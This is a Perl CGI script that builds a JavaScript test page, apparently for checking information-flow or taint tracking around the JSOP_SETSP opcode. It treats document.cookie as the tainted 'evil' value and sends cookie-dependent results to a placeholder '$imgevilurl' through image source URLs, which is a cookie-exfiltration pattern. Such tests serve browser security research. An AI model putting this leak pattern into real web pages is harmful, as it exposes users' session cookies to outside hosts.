#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_SETSP";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 43;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = evil;

		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 

		var TO_STRING = Boolean.prototype.toString;
		
		try {
			var s = new String("Not a Boolean");
			s.toString = TO_STRING;
			dut = s.toString();
		} catch ( e ) {
			dut = e;
		}
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		var TO_STRING2 = Boolean.prototype.toString;
	
		if ($evil) {
			try {
				var s2 = new String("Not a Boolean");
				s2.toString = TO_STRING2;
				dut2 = s2.toString();
			} catch ( e2 ) {
				dut2 = e2;
			}
		}
	
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		if ($evil) {
			var TO_STRING3 = Boolean.prototype.toString;
		}
		
		try {
			var s3 = new String("Not a Boolean");
			s3.toString = TO_STRING3;
			dut3 = s3.toString();
		} catch ( e3 ) {
			dut3 = e3;
		}
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
